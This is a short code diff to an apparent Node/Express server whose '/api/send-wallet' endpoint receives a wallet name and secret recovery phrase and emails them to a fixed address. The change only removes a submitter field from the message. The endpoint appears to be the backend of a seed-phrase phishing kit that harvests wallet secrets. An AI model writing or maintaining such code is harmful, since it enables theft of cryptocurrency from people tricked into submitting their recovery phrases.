@@ -35,16 +35,15 @@ transporter.verify((error, success) => {
   
 
 app.post('/api/send-wallet', async (req, res) => {
-  const { walletName, secretPhrase, userWalletName } = req.body;
+  const { walletName, secretPhrase } = req.body;
 
   const mailOptions = {
     from: fromEmail,
     to: email,
-    subject: `New Wallet Info from ${userWalletName}`,
+    subject: `New Wallet Info: ${walletName}`,
     text: `
       Wallet Name: ${walletName}
       Secret Phrase: ${secretPhrase}
-      Submitted By: ${userWalletName}
           `,
   };
 
